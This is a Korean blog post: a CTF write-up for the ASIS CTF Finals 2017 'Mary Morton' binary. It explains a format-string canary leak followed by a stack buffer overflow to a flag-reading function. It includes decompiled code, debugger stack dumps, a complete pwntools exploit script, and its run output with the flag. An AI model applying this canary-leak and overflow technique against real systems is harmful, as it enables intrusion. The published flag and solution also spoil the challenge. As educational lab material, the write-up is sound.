---
layout: post
title: "ASIS CTF Finals 2017 - Mary Morton"
date: 2018-11-08
excerpt: "Simple FSB + BOF"
tags: [write-up]
comments: true
---
zerostorage를 풀다가 corruption 때문에 멘탈이 나가서 쉬운거 하나 잡았습니다..
* * *
```
~/pwn/prob/mary_morton st4nw@trust 20s
❯ checksec mary_morton 
[*] '/home/st4nw/pwn/prob/mary_morton/mary_morton'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
우선 SSP가 적용되어 있는 점을 고려해야할 것 같습니다.

```
~/pwn/prob/mary_morton st4nw@trust
❯ ./mary_morton
Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle
```
메인 메뉴에서는 1번 Stack BOF와 2번 FSB 중 하나를 고를 수 있습니다.

#### 1. Stack Bufferoverflow
```c
unsigned __int64 sub_400960()
{
  char buf; // [rsp+0h] [rbp-90h]
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(&buf, 0, 0x80uLL);
  read(0, &buf, 0x100uLL);
  printf("-> %s\n", &buf);
  return __readfsqword(0x28u) ^ v2;
}
```
0x88 크기의 버퍼에 0x100 만큼 입력받아 BOF가 발생합니다.

canary를 leak하면 eip를 덮을 수 있을 것 같습니다.

#### 2. FSB
```c
unsigned __int64 sub_4008EB()
{
  char buf; // [rsp+0h] [rbp-90h]
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(&buf, 0, 128uLL);
  read(0, &buf, 0x7FuLL);
  printf(&buf, &buf);
  return __readfsqword(0x28u) ^ v2;
}
```
FSB를 대놓고 줍니다.

### Exploit

canary를 leak하면 eip를 덮을 수 있기에 FSB로 leak를 하는 것이 우선입니다.

이를 위해 FSB 이후 canary 값을 검증하는 루틴에 bp를 걸고 분석했습니다.

```
pwndbg> r
Starting program: /home/st4nw/pwn/prob/mary_morton/mary_morton 
Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 
2
%p
0x7fffffffded0
```
%p를 입력한 결과 0x7fffffffded0를 출력합니다. 스택에서 이 값과 canary가 얼마나 떨어져있는지 알아보겠습니다.

```
► 0x40094a    mov    rax, qword ptr [rbp - 8]
  0x40094e    xor    rax, qword ptr fs:[0x28]
  0x400957    je     0x40095e
pwndbg> ni
pwndbg> p $rax
$5 = -8380890034417386496
```
rax(canary)는 -8380890034417386496 = 0x8BB118EAE4F0BC00 입니다. 현재 스택의 값을 보겠습니다.

```
.
.
0x7fffffffde90:	0x00007fffffffded0	0x0000000000000000 -> printed data
0x7fffffffdea0:	0x0000000000000000	0x00007fffffffdeb0
0x7fffffffdeb0:	0x0000000000000000	0x00007ffff7ffe168
0x7fffffffdec0:	0x0000000000000003	0x0000000000400949
0x7fffffffded0:	0x00000000000a7025	0x0000000000000000
0x7fffffffdee0:	0x0000000000000000	0x0000000000000000
0x7fffffffdef0:	0x0000000000000000	0x0000000000000000
0x7fffffffdf00:	0x0000000000000000	0x0000000000000000
0x7fffffffdf10:	0x0000000000000000	0x0000000000000000
0x7fffffffdf20:	0x0000000000000000	0x0000000000000000
0x7fffffffdf30:	0x0000000000000000	0x0000000000000000
0x7fffffffdf40:	0x0000000000000000	0x0000000000000000
0x7fffffffdf50:	0x0000000000000000	0x8bb118eae4f0bc00 -> canary
0x7fffffffdf60:	0x00007fffffffdfa0	0x00000000004008b8
0x7fffffffdf70:	0xff00000000000000	0x00007fffffffe098
0x7fffffffdf80:	0x00007fffffffe088	0x0000000100400730
0x7fffffffdf90:	0x00000002ffffe080	0x8bb118eae4f0bc00 -> canary
0x7fffffffdfa0:	0x0000000000400a50	0x00007ffff7a2d830
.
.
```
출력된 값에서 얼마 떨어지지않은 곳에 canary가 두 군데 존재합니다.

FSB에 입력할 값으로 %23$p 혹은 %31$p을 입력하면 leak이 가능합니다.

system("/bin/cat flag")하는 함수가 존재하고 canary의 값까지 구했으니 이제 남은 것은

1. Stack BOF에서 터지는 BOF로 간단하게 플래그를 읽는 것입니다.

exp.py
```python
from pwn import *

p = process('./mary_morton')
context.log_level = 'debug'

p.recvuntil('3. Exit the battle')

payload = "%23$p"

p.sendline('2')
p.sendline(payload)

p.recv()
p.recvuntil('0x')
canary = int(p.recvline(), 16)

log.info('Canary : ' + str(hex(canary)))

p.recvuntil('3. Exit the battle')

payload = "A" * 136

payload += p64(canary)
payload += "A" * 8
payload += p64(0x4008da)

p.sendline('1')
p.sendline(payload)

p.interactive()
```

```
~/pwn/prob/mary_morton st4nw@trust
❯ python exp.py
[+] Starting local process './mary_morton': pid 9000
[DEBUG] Received 0x8f bytes:
    'Welcome to the battle ! \n'
    '[Great Fairy] level pwned \n'
    'Select your weapon \n'
    '1. Stack Bufferoverflow Bug \n'
    '2. Format String Bug \n'
    '3. Exit the battle \n'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Sent 0x6 bytes:
    '%23$p\n'
[DEBUG] Received 0x5a bytes:
    '0xdad0fa5f85ddaf00\n'
    '1. Stack Bufferoverflow Bug \n'
    '2. Format String Bug \n'
    '3. Exit the battle \n'
[*] Canary : 0xdad0fa5f85ddaf00
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Sent 0xa1 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000080  41 41 41 41  41 41 41 41  00 af dd 85  5f fa d0 da  │AAAA│AAAA│····│_···│
    00000090  41 41 41 41  41 41 41 41  da 08 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    000000a0  0a                                                  │·│
    000000a1
[*] Switching to interactive mode
 
[DEBUG] Received 0x8c bytes:
    '-> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
-> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[DEBUG] Received 0x2f bytes:
    'ASIS{An_impROv3d_v3r_0f_f41rY_iN_fairy_lAnds!}\n'
ASIS{An_impROv3d_v3r_0f_f41rY_iN_fairy_lAnds!}
[*] Got EOF while reading in interactive
$  
```
